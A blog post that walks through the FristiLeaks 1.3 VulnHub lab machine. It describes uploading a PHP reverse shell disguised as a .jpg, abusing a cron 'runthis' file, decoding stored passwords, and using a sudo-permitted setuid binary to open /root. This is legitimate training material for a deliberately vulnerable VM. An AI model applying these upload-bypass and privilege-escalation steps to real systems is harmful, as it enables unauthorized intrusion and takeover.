---
layout: post
title: FristiLeaks 1.3 Walkthrough
subtitle: Virtual Machine hosted on vulnhub from Ar0xA
date: 2017-04-10 00:00:00
lastupdated: 
category: Vulnhub
tags: [vulnhub, walkthrough]
bigimg: /img/walkthrough2.jpg
comments: true
---

# Table of contents
{:.no_toc}

* Will be replaced with the ToC, excluding the "Contents" header
{:toc}

## Preface

Hi guys, today I'm ready to publish my walkthrough against the vm hosted on vulnhub called [FristiLeaks 1.3](https://www.vulnhub.com/entry/fristileaks-13,133/) by Ar0xA.


## Information Gathering

After launching netdiscover to find the vm's ip address,
![Net Discover](/assets/vulnhub/fristileaks/netdiscover.png)

I scanned the server with nmap and I could see apache web server version 2.4.16 running on port 80:
![Nmap](/assets/vulnhub/fristileaks/nmap.png)

So I browsed it and this is what I saw:
![Web Site](/assets/vulnhub/fristileaks/website.png)

And its source code:
![Web Site Source Code](/assets/vulnhub/fristileaks/website-source.png)


## Vulnerability Analysis

After that I decided to launch nikto, which revealed five directories cola, sisi, beer, icons and images:
![Nikto](/assets/vulnhub/fristileaks/nikto.png)

The file robots.txt reveals:

```plaintext
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```

After that I navigated first in the cola folder and I could see an image, and then in both the sisi and the beef folders returned the same troll page:
![Website Cola](/assets/vulnhub/fristileaks/website-cola.png)

I thought about the homepage that said "Keep Calm and Drink Fristi" and I wonder if that means instead of the drinks like cola and beer, use fristi instead.. In fact a login page appears:
![Website Login](/assets/vulnhub/fristileaks/website-login.png)


## Exploitation

I tried some credentials but I didn't be able to login, so I viewed the page' source code and I could see a base64 image:
![Website Login Image](/assets/vulnhub/fristileaks/website-login-image.png)

In the page' source code there was also a comment with a possible username:

```plaintext
<!--
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->
```

I converted a base64 encoded text to an image and then I could see the image:
![Website Login Image Password](/assets/vulnhub/fristileaks/website-login-image-password.png)

I tried to put these credentials in the login page and I was able to login! :smiley: After that I opened a link to upload my php shell:
![Website Upload](/assets/vulnhub/fristileaks/website-upload.png)

The upload page accepted only images, so I used a little trick.. I added a jpg extension to the php reverse shell, I launched the netcat listener and then I navigated to it:
![Website Reverse Shell](/assets/vulnhub/fristileaks/website-reverse-shell.png)

Good!! I received a reverse shell..
![Reverse Shell](/assets/vulnhub/fristileaks/reverse-shell.png)


## Post-Exploitation

At this time I listed the home directory and I could see three users, admin, eezeepz and fristigod. The admin and fristigod folders were not accessible by apache user, but in the eezeepz folder there were some files:

```plaintext
sh-4.1$ whoami
whoami
apache
sh-4.1$ cd home
cd home
sh-4.1$ ls -l
ls -l
total 20
drwx------. 2 admin     admin      4096 Nov 19  2015 admin
drwx---r-x. 5 eezeepz   eezeepz   12288 Nov 18  2015 eezeepz
drwx------  2 fristigod fristigod  4096 Nov 19  2015 fristigod
sh-4.1$ ls -l admin
ls -l admin
ls: cannot open directory admin: Permission denied
sh-4.1$ ls -l eezeepz
ls -l eezeepz
total 2568
-rwxr-xr-x. 1 eezeepz eezeepz  24376 Nov 17  2015 MAKEDEV
-rwxr-xr-x. 1 eezeepz eezeepz  33559 Nov 17  2015 cbq
-rwxr-xr-x. 1 eezeepz eezeepz   6976 Nov 17  2015 cciss_id
-rwxr-xr-x. 1 eezeepz eezeepz  56720 Nov 17  2015 cfdisk
-rwxr-xr-x. 1 eezeepz eezeepz  25072 Nov 17  2015 chcpu
-rwxr-xr-x. 1 eezeepz eezeepz  52936 Nov 17  2015 chgrp
-rwxr-xr-x. 1 eezeepz eezeepz  31800 Nov 17  2015 chkconfig
-rwxr-xr-x. 1 eezeepz eezeepz  48712 Nov 17  2015 chmod
-rwxr-xr-x. 1 eezeepz eezeepz  53640 Nov 17  2015 chown
-rwxr-xr-x. 1 eezeepz eezeepz  44528 Nov 17  2015 clock
-rwxr-xr-x. 1 eezeepz eezeepz   4808 Nov 17  2015 consoletype
-rwxr-xr-x. 1 eezeepz eezeepz 129992 Nov 17  2015 cpio
-rwxr-xr-x. 1 eezeepz eezeepz  38608 Nov 17  2015 cryptsetup
-rwxr-xr-x. 1 eezeepz eezeepz   5344 Nov 17  2015 ctrlaltdel
-rwxr-xr-x. 1 eezeepz eezeepz  41704 Nov 17  2015 cut
-rwxr-xr-x. 1 eezeepz eezeepz  14832 Nov 17  2015 halt
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 hostname
-rwxr-xr-x. 1 eezeepz eezeepz  44528 Nov 17  2015 hwclock
-rwxr-xr-x. 1 eezeepz eezeepz   7920 Nov 17  2015 kbd_mode
-rwxr-xr-x. 1 eezeepz eezeepz  11576 Nov 17  2015 kill
-rwxr-xr-x. 1 eezeepz eezeepz  16472 Nov 17  2015 killall5
-rwxr-xr-x. 1 eezeepz eezeepz  32928 Nov 17  2015 kpartx
-rwxr-xr-x. 1 eezeepz eezeepz  11464 Nov 17  2015 nameif
-rwxr-xr-x. 1 eezeepz eezeepz 171784 Nov 17  2015 nano
-rwxr-xr-x. 1 eezeepz eezeepz   5512 Nov 17  2015 netreport
-rwxr-xr-x. 1 eezeepz eezeepz 123360 Nov 17  2015 netstat
-rwxr-xr-x. 1 eezeepz eezeepz  13892 Nov 17  2015 new-kernel-pkg
-rwxr-xr-x. 1 eezeepz eezeepz  25208 Nov 17  2015 nice
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 nisdomainname
-rwxr-xr-x. 1 eezeepz eezeepz   4736 Nov 17  2015 nologin
-r--r--r--. 1 eezeepz eezeepz    514 Nov 18  2015 notes.txt
-rwxr-xr-x. 1 eezeepz eezeepz 390616 Nov 17  2015 tar
-rwxr-xr-x. 1 eezeepz eezeepz  11352 Nov 17  2015 taskset
-rwxr-xr-x. 1 eezeepz eezeepz 249000 Nov 17  2015 tc
-rwxr-xr-x. 1 eezeepz eezeepz  51536 Nov 17  2015 telinit
-rwxr-xr-x. 1 eezeepz eezeepz  47928 Nov 17  2015 touch
-rwxr-xr-x. 1 eezeepz eezeepz  11440 Nov 17  2015 tracepath
-rwxr-xr-x. 1 eezeepz eezeepz  12304 Nov 17  2015 tracepath6
-rwxr-xr-x. 1 eezeepz eezeepz  21112 Nov 17  2015 true
-rwxr-xr-x. 1 eezeepz eezeepz  35608 Nov 17  2015 tune2fs
-rwxr-xr-x. 1 eezeepz eezeepz  15410 Nov 17  2015 weak-modules
-rwxr-xr-x. 1 eezeepz eezeepz  12216 Nov 17  2015 wipefs
-rwxr-xr-x. 1 eezeepz eezeepz 504400 Nov 17  2015 xfs_repair
-rwxr-xr-x. 1 eezeepz eezeepz  13712 Nov 17  2015 ypdomainname
-rwxr-xr-x. 1 eezeepz eezeepz     62 Nov 17  2015 zcat
-rwxr-xr-x. 1 eezeepz eezeepz  47520 Nov 17  2015 zic
sh-4.1$ ls -l fristigod
ls -l fristigod
ls: cannot open directory fristigod: Permission denied
```

There was a file called notes.txt that had some interesting information in it:

```plaintext
sh-4.1$ cat notes.txt
cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

## Privilege Escalation

According to this message, there was a script running that will execute any command as admin in the /tmp directory if it’s in a file called runthis. So let’s execute a command that we can access /admin/ folder by using the /tmp/runthis file trick. Inside it I could see a bunch of interesting files, some encrypted files and a python script used to encrypt the files.

```plaintext
sh-4.1$ echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis
echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis
sh-4.1$ ls -l /home/admin
ls -l /home/admin
total 632
-rwxr-xr-x 1 admin     admin      45224 Nov 18  2015 cat
-rwxr-xr-x 1 admin     admin      48712 Nov 18  2015 chmod
-rw-r--r-- 1 admin     admin        737 Nov 18  2015 cronjob.py
-rw-r--r-- 1 admin     admin         21 Nov 18  2015 cryptedpass.txt
-rw-r--r-- 1 admin     admin        258 Nov 18  2015 cryptpass.py
-rwxr-xr-x 1 admin     admin      90544 Nov 18  2015 df
-rwxr-xr-x 1 admin     admin      24136 Nov 18  2015 echo
-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 egrep
-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 grep
-rwxr-xr-x 1 admin     admin      85304 Nov 18  2015 ps
-rw-r--r-- 1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
sh-4.1$ cat cryptedpass.txt
cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq
sh-4.1$ cat whoisyourgodnow.txt
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
sh-4.1$ cat cryptpass.py
cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

I copied the cryptpass python script in my local machine and I modified it a bit, so instead of encrypting the files it decrypts them! :smiling_imp:

```plaintext
root@kali:~# cat cryptpass.py 
import base64,codecs,sys

def encodeString(str):
    decoded = codecs.decode(str[::-1], 'rot13')
    return base64.b64decode(decoded)

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
root@kali:~# python cryptpass.py mVGZ3O3omkJLmy2pcuTq
thisisalsopw123
root@kali:~# python cryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG
LetThereBeFristi!
```

Now I launched a bash shell with a python oneliner, and I tried to login with admin but he didn't run sudo command! Instead the fristigod user was able to run the sudo command:

```plaintext
sh-4.1$ python -c "import pty; pty.spawn('/bin/bash')"
python -c "import pty; pty.spawn('/bin/bash')"
bash-4.1$ su admin
su admin
Password: thisisalsopw123
[admin@localhost ~]$ sudo -l
sudo -l
[sudo] password for admin: thisisalsopw123

Sorry, user admin may not run sudo on localhost.
[admin@localhost ~]$ su fristigod
su fristigod
Password: LetThereBeFristi!

bash-4.1$ sudo -l
sudo -l
[sudo] password for fristigod: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

There was a little hint after launching the sudo -l command.. this user may run commands inside the /var/fristigod/.secret_admin_stuff/ so I navigated into it:

```plaintext
bash-4.1$ cd /var/fristigod/
cd /var/fristigod/
bash-4.1$ ls -la
ls -la
total 16
drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .
drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff
```

Checking the .bash_history file we can learn how to execute the previous root binary.

```plaintext
bash-4.1$ cat .bash_history
cat .bash_history
ls
pwd
ls -lah
cd .secret_admin_stuff/
ls
./doCom 
./doCom test
sudo ls
exit
cd .secret_admin_stuff/
ls
./doCom 
sudo -u fristi ./doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
sudo /var/fristigod/.secret_admin_stuff/doCom
exit
sudo /var/fristigod/.secret_admin_stuff/doCom
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
groups
ls -lah
usermod -G fristigod fristi
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
less /var/log/secure e
Fexit
exit
exit
bash-4.1$ 
```

I navigated into the .secret_admin_stuff folder and I was able to launch doCom script to change the permissions of root folder, so I could view inside it:

```plaintext
bash-4.1$ cd .secret_admin_stuff
cd .secret_admin_stuff
bash-4.1$ ls -l
ls -l
total 8
-rwsr-sr-x 1 root root 7529 Nov 25  2015 doCom
bash-4.1$ sudo -u fristi ./doCom chmod -R 777 /root
sudo -u fristi ./doCom chmod -R 777 /root
bash-4.1$ ls -l /root
ls -l /root
total 4
-rwxrwxrwx. 1 root root 246 Nov 17  2015 fristileaks_secrets.txt
bash-4.1$ cat /root/fristileaks_secrets.txt
cat /root/fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1


bash-4.1$ 
```

Oh yes! I found the Flag!! 

## Conclusion

Thanks to Ar0xA for this CTF!
